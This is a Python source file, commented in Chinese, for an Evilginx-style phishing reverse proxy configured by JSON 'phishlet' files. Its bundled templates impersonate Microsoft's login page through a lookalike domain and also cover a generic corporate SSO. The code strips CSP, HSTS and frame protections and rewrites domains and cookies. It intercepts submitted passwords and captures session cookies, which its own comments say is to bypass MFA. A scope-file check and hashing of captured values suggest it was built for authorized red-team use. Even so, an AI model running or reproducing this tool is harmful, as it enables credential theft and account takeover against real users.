#!/usr/bin/env python3
"""phishlet-proxy — Evilginx2 式 phishlet 声明式反向代理(P1 借鉴)
核心改进: 目标网站代理规则从硬编码变成 phishlet JSON 声明——
  新目标 = 写一个 phishlet 文件,不改代码。
phishlet 结构(Evilginx 兼容子集):
{
  "name": "office365",
  "author": "spectre",
  "proxy_host": "login.microsooft.com",     # 攻击者域(钓鱼用)
  "target_host": "login.microsoft.com",     # 真实目标
  "implicit_proxy": true,                   # 所有子域都代理
  "sub_filters": {                          # 响应内容重写规则
    "login.microsoft.com": ["login.microsooft.com"]
  },
  "session": {                              # 会话捕获(Evilginx 核心能力)
    "cookie_names": ["ESTSAUTHPERSISTENT", "ESTSAUTH", "SignInStateCookie"],
    "auth_path": "/success"
  },
  "credential_fields": ["loginfmt", "passwd"]  # 凭据字段拦截
}
用法:
  phishlet-proxy serve --listen :8443 --phishlet /opt/tools/phishlets/office365.json
  phishlet-proxy list  # 列出可用 phishlet
"""
import sys, os, json, time, hashlib, re, argparse
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError

import time as _time
def scope_gate_full():
    """完整授权门(同 c2-qa): targets+window 双校验,exit 75"""
    import json as _json
    SCOPE = '/opt/tools/c2/scope.json'
    if not os.path.exists(SCOPE):
        print('SCOPE-REJECT: no scope file', file=sys.stderr); sys.exit(75)
    try:
        sc = _json.load(open(SCOPE))
        now = _time.strftime('%Y-%m-%dT%H:%M:%SZ', _time.gmtime())
        ok = (sc.get('targets') and
              sc['window']['start'] and sc['window']['end'] and
              sc['window']['start'] <= now <= sc['window']['end'])
    except Exception:
        ok = False
    if not ok:
        print('SCOPE-REJECT: empty targets or out of window', file=sys.stderr)
        sys.exit(75)
    return sc

# ============================================================
# phishlet 加载
# ============================================================

def load_phishlet(path):
    pl = json.load(open(path))
    required = ['name', 'proxy_host', 'target_host']
    for k in required:
        if k not in pl:
            raise ValueError(f'phishlet missing {k}')
    return pl

def list_phishlets(directory):
    out = []
    for fn in os.listdir(directory):
        if fn.endswith('.json'):
            try:
                pl = load_phishlet(os.path.join(directory, fn))
                out.append({'file': fn, 'name': pl['name'],
                            'target': pl['target_host'],
                            'cookies': len(pl.get('session', {}).get('cookie_names', []))})
            except Exception:
                continue
    return out

# ============================================================
# 代理引擎(phishlet 驱动)
# ============================================================

def make_handler(phishlet, db_file):
    target_host = phishlet['target_host']
    proxy_host = phishlet['proxy_host']
    sub_filters = phishlet.get('sub_filters', {})
    cookie_names = phishlet.get('session', {}).get('cookie_names', [])
    cred_fields = phishlet.get('credential_fields', [])
    target_base = phishlet.get('target_url', f'https://{target_host}')

    class PhishletHandler(BaseHTTPRequestHandler):
        def log(self, msg):
            print(f'[phishlet:{phishlet["name"]}] {msg}', flush=True)

        def track(self, kind, uid, extra=None):
            # F36: 同库并发方必须持同一把锁——phish-track V6c 只锁自己,
            # 此处无锁 load-modify-save 曾致 599/600 事件丢失(exploit PoC)。
            ev = {'kind': kind, 'uid': uid,
                  'ts': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}
            if extra:
                ev.update(extra)
            import fcntl
            with open(db_file + '.lock', 'w') as lf:
                fcntl.flock(lf, fcntl.LOCK_EX)
                try:
                    try:
                        cur = json.load(open(db_file))
                    except Exception:
                        cur = {'events': []}
                    cur['events'].append(ev)
                    json.dump(cur, open(db_file, 'w'), indent=1)
                finally:
                    fcntl.flock(lf, fcntl.LOCK_UN)
            self.log(f'{kind} uid={uid} {extra or ""}')

        def proxy(self, method='GET', body=None):
            """转发到目标——按 phishlet 规则重写"""
            url = target_base + self.path
            headers = {}
            for key in ['Accept', 'Accept-Language', 'User-Agent', 'Content-Type', 'Cookie']:
                if key in self.headers:
                    headers[key] = self.headers[key]
            # Cookie 域替换:我们的域 cookie 当作目标的发
            headers['Host'] = target_host
            headers['Accept-Encoding'] = 'identity'
            headers['Referer'] = f'https://{target_host}/'

            try:
                import ssl
                from urllib.request import build_opener, HTTPSHandler, HTTPRedirectHandler
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

                # 不跟随重定向——302 的 Set-Cookie(session!)必须原样拿到
                class NoRedirect(HTTPRedirectHandler):
                    def redirect_request(self, *a, **kw): return None
                opener = build_opener(NoRedirect, HTTPSHandler(context=ctx))

                req = Request(url, data=body, headers=headers, method=method)
                resp = opener.open(req, timeout=15)
                return resp.status, dict(resp.headers), resp.read()
            except HTTPError as e:
                # 3xx 会走这里(NoRedirect)——headers 里含 Set-Cookie
                return e.code, dict(e.headers), e.read()
            except Exception as e:
                return 502, {}, str(e).encode()

        def rewrite(self, status, headers, body):
            """按 phishlet 重写响应: 剥安全头+域替换+注入追踪"""
            for h in ['Content-Security-Policy', 'X-Frame-Options',
                      'Strict-Transport-Security', 'X-Content-Type-Options']:
                headers.pop(h, None)

            ct = headers.get('Content-Type', headers.get('content-type', ''))
            if 'text/html' in ct or 'javascript' in ct:
                text = body.decode('utf-8', errors='replace')
                # sub_filters: 目标域→代理域(双向)
                text = text.replace(f'https://{target_host}', f'http://{proxy_host}')
                text = text.replace(f'https://{proxy_host}', f'http://{proxy_host}')
                for src, dsts in sub_filters.items():
                    for dst in dsts:
                        text = text.replace(src, dst)
                # 追踪像素
                pixel = f'<img src="http://{proxy_host}/o/proxy.gif" style="display:none">'
                if '</body>' in text:
                    text = text.replace('</body>', f'{pixel}</body>')
                body = text.encode()

            # Set-Cookie 域重写(目标的 cookie 种到我们的域)
            if 'Set-Cookie' in headers or 'set-cookie' in headers:
                raw = headers.get('Set-Cookie', headers.get('set-cookie', ''))
                if isinstance(raw, str):
                    raw = raw.replace(f'domain={target_host}', f'domain={proxy_host}')
                    raw = raw.replace(f'Domain={target_host}', f'Domain={proxy_host}')
                    raw = re.sub(r';\s*[Ss]ecure', '', raw)  # 我们是 http
                    raw = re.sub(r';\s*[Ss]ameSite=\w+', '; SameSite=None', raw)
                    headers['Set-Cookie'] = raw
            return status, headers, body

        def check_session_capture(self, headers):
            """检测目标响应里的 session cookie(Evilginx 核心: 拿 cookie 绕 MFA)"""
            raw = headers.get('Set-Cookie', headers.get('set-cookie', ''))
            if not raw:
                return None
            captured = {}
            for cn in cookie_names:
                m = re.search(f'{re.escape(cn)}=([^;]+)', raw)
                if m:
                    captured[cn] = m.group(1)
            return captured if captured else None

        def do_GET(self):
            u = urlparse(self.path)

            # 追踪像素
            if u.path.endswith('.gif'):
                import base64
                self.track('open', 'proxy', {'ip': self.client_address[0]})
                gif = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
                self.send_response(200)
                self.send_header('Content-Type', 'image/gif')
                self.send_header('Content-Length', str(len(gif)))
                self.end_headers()
                self.wfile.write(gif)
                return

            # 成功页(凭据提交后)
            if u.path == '/success':
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<html><body><h2>Sign-in successful. Redirecting...</h2><script>setTimeout(function(){location.href="/"},3000)</script></body></html>')
                return

            status, headers, body = self.proxy('GET')
            captured = self.check_session_capture(headers)
            if captured:
                # cookie 捕获=完整会话(MFA 已过)——只记哈希指纹+名称
                fp = {k: hashlib.sha256(v.encode()).hexdigest()[:12] for k, v in captured.items()}
                self.track('session-captured', 'proxy', {'cookies': list(captured.keys()), 'fingerprints': fp})
            status, headers, body = self.rewrite(status, headers, body)
            self.send_response(status)
            for k, v in headers.items():
                if k.lower() not in ('transfer-encoding', 'content-length'):
                    self.send_header(k, v)
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_POST(self):
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length) if length else b''
            qs = parse_qs(body.decode('utf-8', errors='replace'))

            # 凭据字段拦截(phishlet 声明哪些字段是凭据)
            captured_creds = {}
            for f in cred_fields:
                for k, v in qs.items():
                    if k.lower() == f.lower() and v:
                        captured_creds[f] = v[0]

            if captured_creds and 'passwd' in ''.join(captured_creds.keys()).lower() or \
               any('pass' in k.lower() or 'pwd' in k.lower() for k in captured_creds):
                # 哈希即毁
                fp = hashlib.sha256(json.dumps(captured_creds, sort_keys=True).encode()).hexdigest()[:16]
                email = next((v for k, v in captured_creds.items() if '@' in v), '')
                self.track('submit', 'proxy', {
                    'cred_hash': fp,
                    'email_domain': email.split('@')[1] if '@' in email else '',
                    'ip': self.client_address[0]})
                # 转发原始凭据到目标(维持会话链——拿 session cookie 必须)
                status, headers, body = self.proxy('POST', body)
                captured = self.check_session_capture(headers)
                if captured:
                    fp2 = {k: hashlib.sha256(v.encode()).hexdigest()[:12] for k, v in captured.items()}
                    self.track('session-captured', 'proxy', {'cookies': list(captured.keys()), 'fingerprints': fp2})
                status, headers, body = self.rewrite(status, headers, body)
                self.send_response(status)
                for k, v in headers.items():
                    if k.lower() not in ('transfer-encoding', 'content-length'):
                        self.send_header(k, v)
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return

            # 非凭据 POST(SSO 握手/CSRF/MFA)——直接转发
            status, headers, body = self.proxy('POST', body)
            captured = self.check_session_capture(headers)
            if captured:
                fp = {k: hashlib.sha256(v.encode()).hexdigest()[:12] for k, v in captured.items()}
                self.track('session-captured', 'proxy', {'cookies': list(captured.keys()), 'fingerprints': fp})
            status, headers, body = self.rewrite(status, headers, body)
            self.send_response(status)
            for k, v in headers.items():
                if k.lower() not in ('transfer-encoding', 'content-length'):
                    self.send_header(k, v)
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass

    return PhishletHandler

def serve(listen, phishlet, db_file):
    scope_gate_full()  # F10: 完整授权门(targets+window)
    host, _, port = listen.rpartition(':')
    handler = make_handler(phishlet, db_file)
    print(f'[phishlet-proxy] {phishlet["name"]}: {listen} → {phishlet["target_host"]}', flush=True)
    print(f'[phishlet-proxy] session cookies: {phishlet.get("session", {}).get("cookie_names", [])}', flush=True)
    print(f'[phishlet-proxy] cred fields: {phishlet.get("credential_fields", [])}', flush=True)
    HTTPServer((host or '0.0.0.0', int(port or 8443)), handler).serve_forever()

# ============================================================
# 内置 phishlet 样例(参考模板)
# ============================================================

SAMPLE_PHISHLETS = {
    'office365': {
        'name': 'office365', 'author': 'spectre',
        'proxy_host': 'login.microsooft-auth.com',
        'target_host': 'login.microsoft.com',
        'target_url': 'https://login.microsoft.com',
        'sub_filters': {'login.microsoft.com': ['login.microsooft-auth.com']},
        'session': {'cookie_names': ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'SignInStateCookie', 'brcap'],
                    'auth_path': '/success'},
        'credential_fields': ['loginfmt', 'passwd', 'login', 'password'],
    },
    'generic-sso': {
        'name': 'generic-sso', 'author': 'spectre',
        'proxy_host': 'sso.target-verify.co',
        'target_host': 'sso.target-corp.com',
        'target_url': 'https://sso.target-corp.com',
        'sub_filters': {},
        'session': {'cookie_names': ['sessionid', 'JSESSIONID', 'ASPXAUTH', 'PHPSESSID'],
                    'auth_path': '/success'},
        'credential_fields': ['username', 'password', 'email', 'passwd', 'loginfmt'],
    },
}

def write_samples(directory):
    os.makedirs(directory, exist_ok=True)
    for name, pl in SAMPLE_PHISHLETS.items():
        p = os.path.join(directory, f'{name}.json')
        json.dump(pl, open(p, 'w'), indent=1)
        print(f'  {p}')

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(__doc__); sys.exit(2)
    if sys.argv[1] == 'serve':
        listen = '--listen' in sys.argv and sys.argv[sys.argv.index('--listen') + 1] or ':8443'
        pl_path = '--phishlet' in sys.argv and sys.argv[sys.argv.index('--phishlet') + 1]
        db = '--db' in sys.argv and sys.argv[sys.argv.index('--db') + 1] or '/opt/tools/phish/track.json'
        if not pl_path:
            print('serve 需要 --phishlet <json>', file=sys.stderr); sys.exit(1)
        serve(listen, load_phishlet(pl_path), db)
    elif sys.argv[1] == 'list':
        d = '--dir' in sys.argv and sys.argv[sys.argv.index('--dir') + 1] or '/opt/tools/phishlets'
        for pl in list_phishlets(d):
            print(f"{pl['name']:>15} → {pl['target']} ({pl['cookies']} session cookies)")
    elif sys.argv[1] == 'init':
        d = '--dir' in sys.argv and sys.argv[sys.argv.index('--dir') + 1] or '/opt/tools/phishlets'
        write_samples(d)
        print(f'sample phishlets → {d}')
